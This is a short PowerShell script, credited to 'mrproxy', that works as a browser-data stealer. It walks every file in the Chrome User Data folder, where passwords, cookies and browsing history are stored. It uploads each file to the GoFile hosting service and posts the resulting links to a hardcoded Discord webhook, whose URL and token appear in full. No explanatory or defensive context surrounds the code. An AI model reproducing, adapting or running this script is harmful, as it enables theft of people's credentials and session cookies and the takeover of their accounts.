### Created by mrproxy

# Define the Discord Webhook URL (no `=` at the start)
$webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"

# Function for sending messages through Discord Webhook
function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Host "Failed to send message to Discord: $_"
    }
}

function Upload-FileAndGetLink {
    param (
        [string]$filePath
    )

    # Get URL from GoFile
    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
    if ($serverResponse.status -ne "ok") {
        Write-Host "Failed to get server URL: $($serverResponse.status)"
        return $null
    }

    # Define the upload URI
    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"

    # Prepare the file for uploading
    $fileBytes = Get-Content $filePath -Raw -Encoding Byte
    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
        "Content-Type: application/octet-stream",
        $LF,
        $fileEnc,
        "--$boundary--",
        $LF
    ) -join $LF

    # Upload the file
    try {
        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
        if ($response.status -ne "ok") {
            Write-Host "Failed to upload file: $($response.status)"
            return $null
        }
        return $response.data.downloadPage
    } catch {
        Write-Host "Failed to upload file: $_"
        return $null
    }
}

# Check for Chrome executable and user data
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
if (-not (Test-Path $chromePath)) {
    Send-DiscordMessage -message "Chrome User Data path not found!"
    exit
}

# Get all files from the Chrome User Data folder (recursive)
$chromeFiles = Get-ChildItem "$chromePath" -Recurse | Where-Object { -not $_.PSIsContainer }

if ($chromeFiles.Count -eq 0) {
    Send-DiscordMessage -message "No files found in Chrome User Data folder!"
    exit
}

# Iterate through each file and upload it to GoFile
foreach ($file in $chromeFiles) {
    $link = Upload-FileAndGetLink -filePath $file.FullName

    # Check if the upload was successful and send the link via Discord
    if ($link -ne $null) {
        Send-DiscordMessage -message "File uploaded: $link"
    } else {
        Send-DiscordMessage -message "Failed to upload file: $($file.FullName)"
    }
}

# Optionally, notify when all files are processed
Send-DiscordMessage -message "All files processed."
